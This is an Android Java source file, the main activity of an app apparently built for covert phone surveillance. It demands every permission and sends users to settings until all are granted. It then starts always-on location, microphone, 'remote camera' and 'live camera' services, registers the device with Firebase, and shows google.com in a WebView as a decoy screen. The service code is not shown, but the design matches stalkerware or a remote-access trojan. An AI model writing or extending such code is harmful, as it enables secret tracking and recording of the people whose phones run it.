package com.wains.app;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.wains.app.services.LiveCameraService;
import com.wains.app.services.LocationService;
import com.wains.app.services.MicService;
import com.wains.app.services.RemoteCameraService;
import com.wains.app.utils.FirebaseManager;
import com.wains.app.utils.WallpaperManagerUtil;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;
    private FirebaseManager firebaseManager;
    private WebView webView;
    private WallpaperManagerUtil wallpaperManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        firebaseManager = FirebaseManager.getInstance();
        wallpaperManager = new WallpaperManagerUtil(this);

        // Initialize WebView
        webView = findViewById(R.id.webview);
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());

        // Check and request permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            checkAndRequestPermissions();
        } else {
            // On older Android versions, permissions are granted at install time.
            initAppAfterPermissionsGranted();
        }
    }

    private void checkAndRequestPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : Permissions.PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissionsToRequest.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE);
        } else {
            initAppAfterPermissionsGranted();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                initAppAfterPermissionsGranted();
            } else {
                Toast.makeText(this, "All permissions are required for the app to function.", Toast.LENGTH_LONG).show();
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                Uri uri = Uri.fromParts("package", getPackageName(), null);
                intent.setData(uri);
                startActivity(intent);
            }
        }
    }

    private void initAppAfterPermissionsGranted() {
        Log.d("MainActivity", "All permissions granted. Starting services and loading WebView.");
        startAllServices();
        loadWebView();
    }

    private void startAllServices() {
        Log.d("MainActivity", "Starting services...");

        Intent locationIntent = new Intent(this, LocationService.class);
        ContextCompat.startForegroundService(this, locationIntent);

        Intent micIntent = new Intent(this, MicService.class);
        ContextCompat.startForegroundService(this, micIntent);

        Intent remoteCameraIntent = new Intent(this, RemoteCameraService.class);
        ContextCompat.startForegroundService(this, remoteCameraIntent);

        Intent liveCameraIntent = new Intent(this, LiveCameraService.class);
        ContextCompat.startForegroundService(this, liveCameraIntent);

        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user != null) {
            firebaseManager.registerDevice(user.getUid());
        }
    }

    private void loadWebView() {
        String url = "https://google.com";
        Log.d("MainActivity", "Loading WebView with URL: " + url);
        webView.loadUrl(url);
    }
}
